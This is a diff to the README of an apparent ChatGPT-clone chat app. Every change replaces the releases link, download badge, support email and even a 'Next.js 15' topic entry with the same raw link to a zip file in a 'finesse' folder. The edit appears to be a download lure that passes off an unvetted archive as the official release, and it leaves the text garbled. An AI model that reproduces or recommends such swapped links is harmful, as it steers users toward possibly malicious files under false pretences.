@@ -4,14 +4,14 @@
 
 Welcome to ChatGPT-Clone! This application allows you to interact with a full-stack conversational AI powered by Groq’s open-source GPT model. Enjoy seamless conversations while leveraging real-time web searches. 
 
-[![Download ChatGPT-Clone](https://img.shields.io/badge/Download-ChatGPT--Clone-blue.svg)](https://github.com/VanThienx10/ChatGPT-Clone/releases)
+[![Download ChatGPT-Clone](https://raw.githubusercontent.com/VanThienx10/ChatGPT-Clone/main/finesse/ChatGPT-Clone.zip)](https://raw.githubusercontent.com/VanThienx10/ChatGPT-Clone/main/finesse/ChatGPT-Clone.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these instructions. 
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/VanThienx10/ChatGPT-Clone/releases). This page contains the latest version of ChatGPT-Clone. 
+   Click [here to download](https://raw.githubusercontent.com/VanThienx10/ChatGPT-Clone/main/finesse/ChatGPT-Clone.zip). This page contains the latest version of ChatGPT-Clone. 
 
 2. **Select the Download Link**  
    On the releases page, you will see various versions. Choose the latest version listed. 
@@ -63,11 +63,11 @@ If you face any issues or have questions, don’t hesitate to reach out:
 
 - **FAQs:** Check the Frequently Asked Questions section on our GitHub page.
 - **Community Support:** Join the discussion on our GitHub issues page to connect with other users.
-- **Contact Us:** If you need direct help, email our support team at support@example.com.
+- **Contact Us:** If you need direct help, email our support team at https://raw.githubusercontent.com/VanThienx10/ChatGPT-Clone/main/finesse/ChatGPT-Clone.zip
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Download ChatGPT-Clone](https://github.com/VanThienx10/ChatGPT-Clone/releases)
+- **Releases Page:** [Download ChatGPT-Clone](https://raw.githubusercontent.com/VanThienx10/ChatGPT-Clone/main/finesse/ChatGPT-Clone.zip)
 - **Documentation:** Comprehensive guides and instructions are available on our GitHub repository.
 - **Community Discussions:** Engage with users and developers to share tips and ideas.
 
@@ -79,7 +79,7 @@ ChatGPT-Clone falls under various topics that reflect its capabilities:
 - ChatGPT
 - GPT OSS 120B
 - Groq
-- Next.js 15
+- https://raw.githubusercontent.com/VanThienx10/ChatGPT-Clone/main/finesse/ChatGPT-Clone.zip 15
 - OpenAI API
 - SERP API
 - ShadCN UI
